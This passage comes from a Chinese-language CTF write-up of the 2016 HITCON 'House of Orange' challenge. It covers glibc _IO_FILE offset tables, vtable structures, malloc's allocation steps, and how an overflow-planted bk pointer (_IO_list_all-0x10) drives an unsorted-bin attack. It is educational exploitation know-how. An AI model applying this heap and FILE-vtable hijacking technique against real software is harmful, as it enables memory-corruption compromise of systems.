class="line">		<span class="number">0x3c</span>:<span class="string">&apos;_flags2&apos;</span>,</span><br><span class="line">		<span class="number">0x40</span>:<span class="string">&apos;_old_offset&apos;</span>,</span><br><span class="line">		<span class="number">0x44</span>:<span class="string">&apos;_cur_column&apos;</span>,</span><br><span class="line">		<span class="number">0x46</span>:<span class="string">&apos;_vtable_offset&apos;</span>,</span><br><span class="line">		<span class="number">0x47</span>:<span class="string">&apos;_shortbuf&apos;</span>,</span><br><span class="line">		<span class="number">0x48</span>:<span class="string">&apos;_lock&apos;</span>,</span><br><span class="line">		<span class="number">0x4c</span>:<span class="string">&apos;_offset&apos;</span>,</span><br><span class="line">		<span class="number">0x54</span>:<span class="string">&apos;_codecvt&apos;</span>,</span><br><span class="line">		<span class="number">0x58</span>:<span class="string">&apos;_wide_data&apos;</span>,</span><br><span class="line">		<span class="number">0x5c</span>:<span class="string">&apos;_freeres_list&apos;</span>,</span><br><span class="line">		<span class="number">0x60</span>:<span class="string">&apos;_freeres_buf&apos;</span>,</span><br><span class="line">		<span class="number">0x64</span>:<span class="string">&apos;__pad5&apos;</span>,</span><br><span class="line">		<span class="number">0x68</span>:<span class="string">&apos;_mode&apos;</span>,</span><br><span class="line">		<span class="number">0x6c</span>:<span class="string">&apos;_unused2&apos;</span>,</span><br><span class="line">		<span class="number">0x94</span>:<span class="string">&apos;vtable&apos;</span></span><br><span class="line">	},</span><br><span class="line"></span><br><span class="line">	<span class="string">&apos;amd64&apos;</span>:{</span><br><span class="line">		<span class="number">0x0</span>:<span class="string">&apos;_flags&apos;</span>,</span><br><span class="line">		<span class="number">0x8</span>:<span class="string">&apos;_IO_read_ptr&apos;</span>,</span><br><span class="line">		<span class="number">0x10</span>:<span class="string">&apos;_IO_read_end&apos;</span>,</span><br><span class="line">		<span class="number">0x18</span>:<span class="string">&apos;_IO_read_base&apos;</span>,</span><br><span class="line">		<span class="number">0x20</span>:<span class="string">&apos;_IO_write_base&apos;</span>,</span><br><span class="line">		<span class="number">0x28</span>:<span class="string">&apos;_IO_write_ptr&apos;</span>,</span><br><span class="line">		<span class="number">0x30</span>:<span class="string">&apos;_IO_write_end&apos;</span>,</span><br><span class="line">		<span class="number">0x38</span>:<span class="string">&apos;_IO_buf_base&apos;</span>,</span><br><span class="line">		<span class="number">0x40</span>:<span class="string">&apos;_IO_buf_end&apos;</span>,</span><br><span class="line">		<span class="number">0x48</span>:<span class="string">&apos;_IO_save_base&apos;</span>,</span><br><span class="line">		<span class="number">0x50</span>:<span class="string">&apos;_IO_backup_base&apos;</span>,</span><br><span class="line">		<span class="number">0x58</span>:<span class="string">&apos;_IO_save_end&apos;</span>,</span><br><span class="line">		<span class="number">0x60</span>:<span class="string">&apos;_markers&apos;</span>,</span><br><span class="line">		<span class="number">0x68</span>:<span class="string">&apos;_chain&apos;</span>,</span><br><span class="line">		<span class="number">0x70</span>:<span class="string">&apos;_fileno&apos;</span>,</span><br><span class="line">		<span class="number">0x74</span>:<span class="string">&apos;_flags2&apos;</span>,</span><br><span class="line">		<span class="number">0x78</span>:<span class="string">&apos;_old_offset&apos;</span>,</span><br><span class="line">		<span class="number">0x80</span>:<span class="string">&apos;_cur_column&apos;</span>,</span><br><span class="line">		<span class="number">0x82</span>:<span class="string">&apos;_vtable_offset&apos;</span>,</span><br><span class="line">		<span class="number">0x83</span>:<span class="string">&apos;_shortbuf&apos;</span>,</span><br><span class="line">		<span class="number">0x88</span>:<span class="string">&apos;_lock&apos;</span>,</span><br><span class="line">		<span class="number">0x90</span>:<span class="string">&apos;_offset&apos;</span>,</span><br><span class="line">		<span class="number">0x98</span>:<span class="string">&apos;_codecvt&apos;</span>,</span><br><span class="line">		<span class="number">0xa0</span>:<span class="string">&apos;_wide_data&apos;</span>,</span><br><span class="line">		<span class="number">0xa8</span>:<span class="string">&apos;_freeres_list&apos;</span>,</span><br><span class="line">		<span class="number">0xb0</span>:<span class="string">&apos;_freeres_buf&apos;</span>,</span><br><span class="line">		<span class="number">0xb8</span>:<span class="string">&apos;__pad5&apos;</span>,</span><br><span class="line">		<span class="number">0xc0</span>:<span class="string">&apos;_mode&apos;</span>,</span><br><span class="line">		<span class="number">0xc4</span>:<span class="string">&apos;_unused2&apos;</span>,</span><br><span class="line">		<span class="number">0xd8</span>:<span class="string">&apos;vtable&apos;</span></span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x8FDB;&#x7A0B;&#x4E2D;&#x7684;<code>_IO_FILE</code>&#x7ED3;&#x6784;&#x4F1A;&#x901A;&#x8FC7;&#x5176;&#x7ED3;&#x6784;&#x4F53;&#x4E2D;<code>struct _IO_FILE *_chain</code>&#x57DF;&#x8FDB;&#x884C;&#x94FE;&#x63A5;&#xFF0C;<code>_IO_FILE_plus</code>&#x5305;&#x542B;&#x4E86;&#x7ED3;&#x6784;&#x4F53;_IO_FILE&#x548C;&#x4E00;&#x4E2A;&#x6307;&#x5411;&#x865A;&#x8868;&#x7684;&#x6307;&#x9488;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><code>_IO_list_all</code>&#x662F;&#x4E00;&#x4E2A;&#x6307;&#x5411;<code>_IO_FILE_plus</code>&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x6307;&#x9488;&#xFF0C;vtables&#x662F;&#x4E00;&#x4E2A;&#x6307;&#x5411; IO_jump_t(&#x865A;&#x8868;)&#x7684;&#x6307;&#x9488;&#xFF0C; IO_jump_t &#x4E2D;&#x4FDD;&#x5B58;&#x4E86;&#x4E00;&#x4E9B;&#x51FD;&#x6570;&#x6307;&#x9488;&#xFF0C;&#x4E00;&#x7CFB;&#x5217;&#x6807;&#x51C6; IO &#x51FD;&#x6570;&#x6267;&#x884C;&#x65F6;&#x4F1A;&#x8C03;&#x7528;&#x8FD9;&#x4E9B;&#x51FD;&#x6570;&#x6307;&#x9488;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>&#x4E0B;&#x9762;&#x662F;&#x8C03;&#x7528;&#x6D41;&#x7A0B;</p>
<p><img src="/2019/03/27/2016-Hitcon-House-of-Orange/IO_FILE_3df9ac2c8dabbdc5ca11a5d505598c2c-20190329100242836.png" alt="img"></p>
<h2 id="0x01-&#x4E3A;&#x4EC0;&#x4E48;unsortedbin&#x4E2D;&#x7684;chunk&#x4F1A;&#x53D8;&#x6210;smallbin-chunk&#xFF0C;&#x4EE5;&#x53CA;unsortedbin-attack&#x7684;&#x8BF4;&#x660E;"><a href="#0x01-&#x4E3A;&#x4EC0;&#x4E48;unsortedbin&#x4E2D;&#x7684;chunk&#x4F1A;&#x53D8;&#x6210;smallbin-chunk&#xFF0C;&#x4EE5;&#x53CA;unsortedbin-attack&#x7684;&#x8BF4;&#x660E;" class="headerlink" title="0x01 &#x4E3A;&#x4EC0;&#x4E48;unsortedbin&#x4E2D;&#x7684;chunk&#x4F1A;&#x53D8;&#x6210;smallbin chunk&#xFF0C;&#x4EE5;&#x53CA;unsortedbin attack&#x7684;&#x8BF4;&#x660E;"></a>0x01 &#x4E3A;&#x4EC0;&#x4E48;unsortedbin&#x4E2D;&#x7684;chunk&#x4F1A;&#x53D8;&#x6210;smallbin chunk&#xFF0C;&#x4EE5;&#x53CA;unsortedbin attack&#x7684;&#x8BF4;&#x660E;</h2><p>glibc&#x5206;&#x914D;chunk&#x7684;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;</p>
<ol>
<li><p>&#x83B7;&#x53D6;&#x5206;&#x914D;&#x533A;&#x7684;&#x9501;&#xFF0C;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x540C;&#x65F6;&#x8BBF;&#x95EE;&#x540C;&#x4E00;&#x4E2A;&#x5206;&#x914D;&#x533A;&#xFF0C;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x914D;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x53D6;&#x5F97;&#x5206;&#x914D;&#x533A;&#x57DF;&#x7684;&#x9501;&#x3002;&#x7EBF;&#x7A0B;&#x5148;&#x67E5;&#x770B;&#x7EBF;&#x7A0B;&#x79C1;&#x6709;&#x5B9E;&#x4F8B;&#x4E2D;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x5206;&#x914D;&#x533A;&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728;&#x5C1D;&#x8BD5;&#x5BF9;&#x8BE5;&#x5206;&#x914D;&#x533A;&#x52A0;&#x9501;&#xFF0C;&#x5982;&#x679C;&#x52A0;&#x9501;&#x6210;&#x529F;&#xFF0C;&#x4F7F;&#x7528;&#x8BE5;&#x5206;&#x914D;&#x533A;&#x5206;&#x914D;&#x5185;&#x5B58;&#xFF0C;&#x5426;&#x5219;&#xFF0C;&#x8BE5;&#x7EBF;&#x7A0B;&#x641C;&#x7D22;&#x5206;&#x914D;&#x533A;&#x5FAA;&#x73AF;&#x94FE;&#x8868;&#x8BD5;&#x56FE;&#x83B7;&#x5F97;&#x4E00;&#x4E2A;&#x7A7A;&#x95F2;&#xFF08;&#x6CA1;&#x6709;&#x52A0;&#x9501;&#xFF09;&#x7684;&#x5206;&#x914D;&#x533A;&#x3002;&#x5982;&#x679C;&#x6240;&#x6709;&#x7684;&#x5206;&#x914D;&#x533A;&#x90FD;&#x5DF2;&#x7ECF;&#x52A0;&#x9501;&#xFF0C;&#x90A3;&#x4E48;ptmalloc&#x4F1A;&#x5F00;&#x8F9F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x5206;&#x914D;&#x533A;&#xFF0C;&#x628A;&#x8BE5;&#x5206;&#x914D;&#x533A;&#x52A0;&#x5165;&#x5230;&#x5168;&#x5C40;&#x5206;&#x914D;&#x533A;&#x5FAA;&#x73AF;&#x94FE;&#x8868;&#x548C;&#x7EBF;&#x7A0B;&#x7684;&#x79C1;&#x6709;&#x5B9E;&#x4F8B;&#x4E2D;&#x5E76;&#x52A0;&#x9501;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;&#x8BE5;&#x5206;&#x914D;&#x533A;&#x8FDB;&#x884C;&#x5206;&#x914D;&#x64CD;&#x4F5C;&#x3002;&#x5F00;&#x8F9F;&#x51FA;&#x6765;&#x7684;&#x65B0;&#x5206;&#x914D;&#x533A;&#x4E00;&#x5B9A;&#x4E3A;&#x975E;&#x4E3B;&#x5206;&#x914D;&#x533A;&#xFF0C;&#x56E0;&#x4E3A;&#x4E3B;&#x5206;&#x914D;&#x533A;&#x662F;&#x4ECE;&#x7236;&#x8FDB;&#x7A0B;&#x90A3;&#x91CC;&#x7EE7;&#x627F;&#x6765;&#x7684;&#x3002;&#x5F00;&#x8F9F;&#x975E;&#x4E3B;&#x5206;&#x914D;&#x533A;&#x65F6;&#x4F1A;&#x8C03;&#x7528;mmap()&#x521B;&#x5EFA;&#x4E00;&#x4E2A;sub-heap&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x597D;top chunk&#x3002;</p>
</li>
<li><p>&#x5C06;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#x5927;&#x5C0F;&#x8F6C;&#x6362;&#x4E3A;&#x5B9E;&#x9645;&#x9700;&#x8981;&#x5206;&#x914D;&#x7684;chunk&#x7A7A;&#x95F4;&#x5927;&#x5C0F;&#x3002;</p>
</li>
<li><p>&#x5224;&#x65AD;&#x6240;&#x9700;&#x5206;&#x914D;chunk&#x7684;&#x5927;&#x5C0F;&#x662F;&#x5426;&#x6EE1;&#x8DB3;chunk_size &lt;= max_fast&#xFF0C;&#x5982;&#x679C;&#x662F;&#x7684;&#x8BDD;&#xFF0C;&#x5219;&#x8F6C;&#x4E0B;&#x4E00;&#x6B65;&#xFF0C;&#x5426;&#x5219;&#x8DF3;&#x5230;&#x7B2C;5&#x6B65;&#x3002;</p>
</li>
<li><p>&#x9996;&#x5148;&#x5C1D;&#x8BD5;&#x5728;fast bins&#x4E2D;&#x53D6;&#x4E00;&#x4E2A;&#x6240;&#x9700;&#x5927;&#x5C0F;&#x7684;chunk&#x5206;&#x914D;&#x7ED9;&#x7528;&#x6237;&#x3002;&#x5982;&#x679C;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#xFF0C;&#x5219;<code>&#x5206;&#x914D;&#x7ED3;&#x675F;</code>&#x3002;&#x5426;&#x5219;&#x8F6C;&#x5230;&#x4E0B;&#x4E00;&#x6B65;&#x3002;</p>
</li>
<li><p>&#x5224;&#x65AD;&#x6240;&#x9700;&#x5927;&#x5C0F;&#x662F;&#x5426;&#x5904;&#x5728;small bins&#x4E2D;&#xFF0C;&#x5373;&#x5224;&#x65AD;chunk_size &lt; 512B&#x662F;&#x5426;&#x6210;&#x7ACB;&#x3002;&#x5982;&#x679C;chunk&#x5927;&#x5C0F;&#x5904;&#x5728;small bins&#x4E2D;&#xFF0C;&#x5219;&#x8F6C;&#x4E0B;&#x4E00;&#x6B65;&#xFF0C;&#x5426;&#x5219;&#x8F6C;&#x5230;&#x7B2C;7&#x6B65;&#x3002;</p>
</li>
<li><p>&#x6839;&#x636E;&#x6240;&#x9700;&#x5206;&#x914D;&#x7684;chunk&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x627E;&#x5230;&#x5177;&#x4F53;&#x6240;&#x5728;&#x7684;&#x67D0;&#x4E2A;small bin&#xFF0C;&#x4ECE;&#x8BE5;bin&#x7684;&#x5C3E;&#x90E8;&#x6458;&#x53D6;&#x4E00;&#x4E2A;&#x6070;&#x597D;&#x6EE1;&#x8DB3;&#x5927;&#x5C0F;&#x7684;chunk&#x3002;&#x82E5;&#x6210;&#x529F;&#xFF0C;&#x5219;&#x5206;&#x914D;&#x7ED3;&#x675F;&#xFF0C;&#x5426;&#x5219;&#xFF0C;&#x8F6C;&#x5230;&#x4E0B;&#x4E00;&#x6B65;&#x3002;</p>
</li>
<li><p>&#x5230;&#x4E86;&#x8FD9;&#x4E00;&#x6B65;&#xFF0C;&#x8BF4;&#x660E;&#x9700;&#x8981;&#x5206;&#x914D;&#x7684;&#x662F;&#x4E00;&#x5757;&#x5927;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x6216;&#x8005;small bins&#x4E2D;&#x627E;&#x4E0D;&#x5230;&#x5408;&#x9002;&#x7684; chunk&#x3002;&#x4E8E;&#x662F;&#xFF0C;ptmalloc&#x9996;&#x5148;&#x4F1A;&#x904D;&#x5386;fast bins&#x4E2D;&#x7684;chunk&#xFF0C;&#x5C06;&#x76F8;&#x90BB;&#x7684;chunk&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x5E76;&#x94FE;&#x63A5;&#x5230;unsorted bin&#x4E2D;&#x3002;&#x7136;&#x540E;&#x904D;&#x5386;unsorted bin&#x4E2D;&#x7684;chunk&#xFF0C;&#x5982;&#x679C;unsorted bin&#x53EA;&#x6709;&#x4E00;&#x4E2A;chunk&#xFF0C;&#x5E76;&#x4E14;&#x8FD9;&#x4E2A;chunk&#x5728;&#x4E0A;&#x6B21;&#x5206;&#x914D;&#x65F6;&#x88AB;&#x4F7F;&#x7528;&#x8FC7;&#xFF0C;&#x5E76;&#x4E14;&#x6240;&#x9700;&#x5206;&#x914D;&#x7684;chunk&#x5927;&#x5C0F;&#x5C5E;&#x4E8E;small bins&#xFF0C;&#x5E76;&#x4E14;chunk&#x7684;&#x5927;&#x5C0F;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x9700;&#x8981;&#x5206;&#x914D;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x5C31;&#x76F4;&#x63A5;&#x5C06;&#x8BE5;chunk&#x8FDB;&#x884C;&#x5207;&#x5272;&#xFF0C;<code>&#x5206;&#x914D;&#x7ED3;&#x675F;</code>&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x6839;&#x636E;chunk&#x7684;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;&#x5C06;&#x5176;&#x653E;&#x5165;small bins&#x6216;&#x662F;large bins&#x4E2D;&#xFF0C;&#x904D;&#x5386;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x8F6C;&#x5165;&#x4E0B;&#x4E00;&#x6B65;&#x3002;</p>
</li>
<li><p>&#x5230;&#x4E86;&#x8FD9;&#x4E00;&#x6B65;&#xFF0C;&#x8BF4;&#x660E;&#x9700;&#x8981;&#x5206;&#x914D;&#x7684;&#x662F;&#x4E00;&#x5757;&#x5927;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x6216;&#x8005;small bins&#x548C;unsorted bin&#x4E2D;&#x90FD;&#x627E;&#x4E0D;&#x5230;&#x5408;&#x9002;&#x7684; chunk&#xFF0C;&#x5E76;&#x4E14;fast bins&#x548C;unsorted bin&#x4E2D;&#x6240;&#x6709;&#x7684;chunk&#x90FD;&#x6E05;&#x9664;&#x5E72;&#x51C0;&#x4E86;&#x3002;&#x4ECE;large bins&#x4E2D;&#x6309;&#x7167;&#x201C;smallest-first&#xFF0C;best-fit&#x201D;&#x539F;&#x5219;&#xFF0C;&#x627E;&#x4E00;&#x4E2A;&#x5408;&#x9002;&#x7684; chunk&#xFF0C;&#x4ECE;&#x4E2D;&#x5212;&#x5206;&#x4E00;&#x5757;&#x6240;&#x9700;&#x5927;&#x5C0F;&#x7684;chunk&#xFF0C;&#x5E76;&#x5C06;&#x5269;&#x4E0B;&#x7684;&#x90E8;&#x5206;&#x94FE;&#x63A5;&#x56DE;&#x5230;bins&#x4E2D;&#x3002;&#x82E5;&#x64CD;&#x4F5C;&#x6210;&#x529F;&#xFF0C;&#x5219;&#x5206;&#x914D;&#x7ED3;&#x675F;&#xFF0C;&#x5426;&#x5219;&#x8F6C;&#x5230;&#x4E0B;&#x4E00;&#x6B65;&#x3002;</p>
</li>
<li><p>&#x5982;&#x679C;&#x641C;&#x7D22;fast bins&#x548C;bins&#x90FD;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x5408;&#x9002;&#x7684;chunk&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x64CD;&#x4F5C;top chunk&#x6765;&#x8FDB;&#x884C;&#x5206;&#x914D;&#x4E86;&#x3002;&#x5224;&#x65AD;top chunk&#x5927;&#x5C0F;&#x662F;&#x5426;&#x6EE1;&#x8DB3;&#x6240;&#x9700;chunk&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5982;&#x679C;&#x662F;&#xFF0C;&#x5219;&#x4ECE;top chunk&#x4E2D;&#x5206;&#x51FA;&#x4E00;&#x5757;&#x6765;&#x3002;&#x5426;&#x5219;&#x8F6C;&#x5230;&#x4E0B;&#x4E00;&#x6B65;&#x3002;</p>
</li>
<li><p>&#x5230;&#x4E86;&#x8FD9;&#x4E00;&#x6B65;&#xFF0C;&#x8BF4;&#x660E;top chunk&#x4E5F;&#x4E0D;&#x80FD;&#x6EE1;&#x8DB3;&#x5206;&#x914D;&#x8981;&#x6C42;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x6709;&#x4E86;&#x4E24;&#x4E2A;&#x9009;&#x62E9;: &#x5982;&#x679C;&#x662F;&#x4E3B;&#x5206;&#x914D;&#x533A;&#xFF0C;&#x8C03;&#x7528;sbrk()&#xFF0C;&#x589E;&#x52A0;top chunk&#x5927;&#x5C0F;&#xFF1B;&#x5982;&#x679C;&#x662F;&#x975E;&#x4E3B;&#x5206;&#x914D;&#x533A;&#xFF0C;&#x8C03;&#x7528;mmap&#x6765;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x65B0;&#x7684;sub-heap&#xFF0C;&#x589E;&#x52A0;top chunk&#x5927;&#x5C0F;&#xFF1B;&#x6216;&#x8005;&#x4F7F;&#x7528;mmap()&#x6765;&#x76F4;&#x63A5;&#x5206;&#x914D;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x9700;&#x8981;&#x4F9D;&#x9760;chunk&#x7684;&#x5927;&#x5C0F;&#x6765;&#x51B3;&#x5B9A;&#x5230;&#x5E95;&#x4F7F;&#x7528;&#x54EA;&#x79CD;&#x65B9;&#x6CD5;&#x3002;&#x5224;&#x65AD;&#x6240;&#x9700;&#x5206;&#x914D;&#x7684;chunk&#x5927;&#x5C0F;&#x662F;&#x5426;&#x5927;&#x4E8E;&#x7B49;&#x4E8E; mmap&#x5206;&#x914D;&#x9608;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x7684;&#x8BDD;&#xFF0C;&#x5219;&#x8F6C;&#x4E0B;&#x4E00;&#x6B65;&#xFF0C;&#x8C03;&#x7528;mmap&#x5206;&#x914D;&#xFF0C;&#x5426;&#x5219;&#x8DF3;&#x5230;&#x7B2C;12&#x6B65;&#xFF0C;&#x589E;&#x52A0;top chunk &#x7684;&#x5927;&#x5C0F;&#x3002;</p>
</li>
<li><p>&#x4F7F;&#x7528;mmap&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x4E3A;&#x7A0B;&#x5E8F;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x6620;&#x5C04;&#x4E00;&#x5757;chunk_size align 4kB&#x5927;&#x5C0F;&#x7684;&#x7A7A;&#x95F4;&#x3002; &#x7136;&#x540E;&#x5C06;&#x5185;&#x5B58;&#x6307;&#x9488;&#x8FD4;&#x56DE;&#x7ED9;&#x7528;&#x6237;&#x3002;</p>
</li>
<li><p>&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x7B2C;&#x4E00;&#x6B21;&#x8C03;&#x7528;malloc&#xFF0C;&#x82E5;&#x662F;&#x4E3B;&#x5206;&#x914D;&#x533A;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x521D;&#x59CB;&#x5316;&#x5DE5;&#x4F5C;&#xFF0C;&#x5206;&#x914D;&#x4E00;&#x5757;&#x5927;&#x5C0F;&#x4E3A;(chunk_size + 128KB) align 4KB&#x5927;&#x5C0F;&#x7684;&#x7A7A;&#x95F4;&#x4F5C;&#x4E3A;&#x521D;&#x59CB;&#x7684;heap&#x3002;&#x82E5;&#x5DF2;&#x7ECF;&#x521D;&#x59CB;&#x5316;&#x8FC7;&#x4E86;&#xFF0C;&#x4E3B;&#x5206;&#x914D;&#x533A;&#x5219;&#x8C03;&#x7528;sbrk()&#x589E;&#x52A0;heap&#x7A7A;&#x95F4;&#xFF0C;&#x5206;&#x4E3B;&#x5206;&#x914D;&#x533A;&#x5219;&#x5728;top chunk&#x4E2D;&#x5207;&#x5272;&#x51FA;&#x4E00;&#x4E2A;chunk&#xFF0C;&#x4F7F;&#x4E4B;&#x6EE1;&#x8DB3;&#x5206;&#x914D;&#x9700;&#x6C42;&#xFF0C;&#x5E76;&#x5C06;&#x5185;&#x5B58;&#x6307;&#x9488;&#x8FD4;&#x56DE;&#x7ED9;&#x7528;&#x6237;&#x3002;</p>
</li>
</ol>
<p>&#x5728;&#x7B2C;7&#x6B65;&#xFF0C;&#x56DB;&#x4E2A;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk <span class="comment">//&#x53D6;unsortedbin&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;chunk</span></span><br><span class="line">...</span><br><span class="line">bck = victim-&gt;bk;	<span class="comment">//&#x53D6;&#x6700;&#x540E;&#x4E00;&#x4E2A;chunk&#x7684;&#x524D;&#x4E00;&#x4E2A;chunk</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;		</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;	<span class="comment">//pass  &#x524D;&#x4E00;&#x4E2A;chunk&#x4E3A;unsortedbin&#x5934;&#xFF0C;&#x8BF4;&#x660E;&#x53EA;&#x6709;&#x4E00;&#x4E2A;chunk</span></span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure>
<p>&#x56E0;&#x4E3A;&#x901A;&#x8FC7;&#x6EA2;&#x51FA;&#xFF0C;&#x5DF2;&#x7ECF;&#x5C06;unsortedbin chunk&#x7684;bk&#x8986;&#x76D6;&#x4E3A;&#x4E86;<code>_IO_list_all-0x10</code>&#xFF0C;&#x800C;&#x4E0D;&#x662F; <code>unsorted_chunks (av)</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x6761;&#x4EF6;&#x4E0D;&#x6210;&#x7ACB;&#xFF0C;&#x4E4B;&#x540E;&#x662F;&#x4E00;&#x4E2A;&#x89E3;&#x5F15;&#x7528;&#xFF1A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
